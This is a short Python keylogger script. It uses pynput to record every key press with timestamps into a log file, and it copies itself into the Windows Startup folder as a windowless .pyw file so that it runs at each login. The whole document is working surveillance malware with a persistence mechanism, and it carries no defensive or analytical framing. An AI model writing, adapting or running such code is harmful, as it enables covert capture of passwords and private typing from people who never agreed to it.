from pynput.keyboard import Listener
import os
import logging
from shutil import copyfile

username = os.getlogin()
logging_dir = input("Where do you want the log file to be saved? ")

copyfile('main.py', f"C:/Users/{username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/main.pyw")

logging.basicConfig(filename=f"{logging_dir}/logfile.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")

def keyHandler(key):
    logging.info(key)

with Listener(on_press=keyHandler) as listner:
    listner.join()
